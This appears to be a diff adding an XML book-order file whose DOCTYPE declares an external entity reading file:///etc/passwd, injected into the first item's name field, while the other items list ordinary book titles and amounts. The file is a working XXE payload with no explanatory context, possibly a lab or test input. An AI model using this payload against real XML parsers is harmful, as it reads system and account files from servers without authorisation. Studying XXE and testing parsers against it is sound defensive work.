@@ -1,0 +1,30 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY c SYSTEM "file:///etc/passwd">
+]>
+<order>
+	<item>
+		<name>&c;</name>
+		<amount>14</amount>
+	</item>
+	<item>
+	        <name>Beach Lawyer (Beach Lawyer Series)</name>
+	        <amount>81</amount>
+        </item>
+        <item>
+	        <name>Crimes Against a Book Club</name>
+	        <amount>16</amount>
+        </item>
+        <item>
+	        <name>Silent Child</name>
+	        <amount>6</amount>
+        </item>
+        <item>
+	        <name>The Handmaid's Tale</name>
+	        <amount>19</amount>
+        </item>
+        <item>
+	        <name>All the Lies We Tell (Quarry Road Book 1)</name>
+	        <amount>77</amount>
+	</item>
+</order>
